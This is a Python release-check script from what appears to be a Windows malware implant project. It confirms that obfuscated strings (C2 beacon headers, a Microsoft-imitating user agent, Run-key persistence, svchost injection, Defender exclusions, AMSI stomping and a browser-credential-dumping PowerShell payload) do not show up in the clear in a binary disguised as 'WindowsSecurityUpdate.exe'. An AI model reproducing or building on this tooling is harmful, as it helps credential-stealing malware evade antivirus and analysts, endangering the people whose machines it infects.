#!/usr/bin/env python3
"""
Assert that a release implant does not carry known strings in the clear.

include/obfuscate.hpp encrypts XS/XSW literals by evaluating a constexpr
constructor at build time, so a release binary should contain only ciphertext.
Whether a compiler folds a given construction is an optimisation, not a
language guarantee: a regression here is invisible until someone runs
`strings` on the artifact. This script is the mechanical check behind the
README's claim that a release build carries no protocol strings, no embedded
payload fragments and no build-time secrets in the clear. Needles are searched
in both UTF-8 and UTF-16LE against the raw file.

Run it against every release artifact (CI does, right after the MinGW build):

    python tests/check_strings.py build/WindowsSecurityUpdate.exe \
        --secret "<beacon-token-the-binary-was-built-with>" \
        --secret "<c2-host-the-binary-was-built-with>"

Exit codes: 0 no plaintext found, 1 leak(s), 2 usage error.

Deliberately NOT checked: strings that are plaintext by design. The %APPDATA%
install path, the PEB-spoofed System32 path and the scheduled-task name inside
the schtasks command lines are documented artifacts of the project (README
sections 16/17) and are expected to appear; they are not secrets.
"""
import argparse
import sys
from pathlib import Path

# XS/XSW-wrapped literals that must never survive a release build: beacon
# protocol mimicry and headers, toolkit names on the persistence / injection /
# evasion paths, and distinctive fragments of the embedded PowerShell script.
MUST_NOT_APPEAR = [
    "Microsoft-WNS/10.0",                                  # User-Agent, src/c2.cpp
    "X-Beacon-Token",                                      # beacon header, src/c2.cpp
    "ngrok-skip-browser-warning",                          # tunnel header, src/c2.cpp
    "application/dns-message",                             # DoH POST content type, src/doh.cpp
    "dns-query",                                           # DoH endpoint path, src/c2.cpp
    r"Software\Microsoft\Windows\CurrentVersion\Run",       # src/persistence.cpp
    "svchost.exe",                                         # migration target, src/injection.cpp
    "wer.dll",                                             # WER disable, src/main.cpp
    "ExclusionPath",                                       # Defender exclusion, src/evasion.cpp
    r"C:\Windows\System32\amsi.dll",                        # module-stomp host, src/c2.cpp
    "ChainingModeGCM",                                     # browser_dump.ps1 chunk marker
    "browser credential recovery",                         # browser_dump.ps1 chunk header
    "single source of truth",                              # browser_dump.ps1 chunk header
    "Login Data",                                          # browser_dump.ps1
    "app-bound",                                           # browser_dump.ps1
]


def occurrences(data: bytes, needle: str):
    """(utf-8 count, utf-16le count) of needle in data."""
    return data.count(needle.encode("utf-8")), data.count(needle.encode("utf-16-le"))


def main() -> int:
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("binary", nargs="?", help="built implant to scan")
    ap.add_argument("--secret", action="append", default=[], metavar="STRING",
                    help="build-time value that must not be in the clear; pass the "
                         "beacon token and C2 host the binary was built with. Repeatable.")
    ap.add_argument("--list", action="store_true",
                    help="print the built-in checklist and exit")
    args = ap.parse_args()

    if args.list:
        for s in MUST_NOT_APPEAR:
            print(s)
        return 0
    if not args.binary:
        ap.error("a binary path is required unless --list is given")

    path = Path(args.binary)
    if not path.is_file():
        print(f"[!] not a file: {path}")
        return 2
    data = path.read_bytes()

    needles = [(s, "built-in") for s in MUST_NOT_APPEAR]
    needles += [(s, "secret") for s in args.secret]

    findings = 0
    for needle, kind in needles:
        utf8, utf16 = occurrences(data, needle)
        if utf8 or utf16:
            findings += 1
            where = ", ".join(name for name, n in (("utf-8", utf8), ("utf-16le", utf16)) if n)
            print(f"  [LEAK] {kind:8s} {needle!r} present in {where}")

    print(f"checked {len(needles)} string(s) against {path.name} ({len(data)} bytes)")
    if findings:
        print(f"[!] {findings} plaintext string(s) survived compilation — the XS/XSW "
              f"construction was not folded into rodata for these sites")
        return 1
    print("[ok] no checked string appears in the clear")
    return 0


if __name__ == "__main__":
    sys.exit(main())
